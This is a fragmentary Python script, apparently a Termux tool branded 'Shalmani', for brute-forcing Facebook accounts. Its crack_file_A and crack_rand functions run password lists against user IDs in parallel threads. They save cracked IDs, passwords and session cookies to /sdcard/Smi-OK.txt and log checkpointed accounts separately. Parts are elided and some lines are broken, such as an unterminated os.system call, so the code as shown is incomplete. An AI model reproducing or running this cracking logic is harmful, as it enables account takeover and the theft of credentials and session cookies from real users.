...
#!usr/lib/python3.11
#OPEN SOURCE BY JUTT
print(" Re Open source by MR Smi")
...
os.system('xdg-open )
logo1 = f"""{W}
\033[1;32m★彡[ꜱʜᴀʟᴍᴀɴɪ]彡★
\033[1;31m★彡[ꜱʜᴀʟᴍᴀɴɪ]彡★
\033[1;33m★彡[ꜱʜᴀʟᴍᴀɴɪ]彡★
\033[1;32m★彡[ꜱʜᴀʟᴍᴀɴɪ]彡★
\033[1;33m<><><><><><><><><<><><><><><><><><><><><><><>
 [<>] \033[1;36mOWNER   : Abdul Rehman Shalmani
 [<>] \033[1;32mBROTHER :  Shalmani
 [<>] \033[1;34mGITHUB  :  Shalmani007
...
def Awm_File():
    ...
    with tred(max_workers=30) as My_Tanisha:
        ...
        print(f" TOTAL OK ID SAVE IN : {G}/sdcard/Smi-OK.txt{W}")
        print(f" TOTAL CP ID SAVE IN : {R}/sdcard/Smi-CP.txt{W}")
...
def crack_file_A(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[Smi>FILE] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r {G}[Smi-OK] {ids} | {pas}')
                open('/sdcard/Smi-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                open('/sdcard/Smi-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def crack_rand(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[Smi>RNDM] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {
            ...
            if "access_token" in po:
                uid = str(po['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}[Smi-OK] {uid} | {pas}')
                open('/sdcard/Smi-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
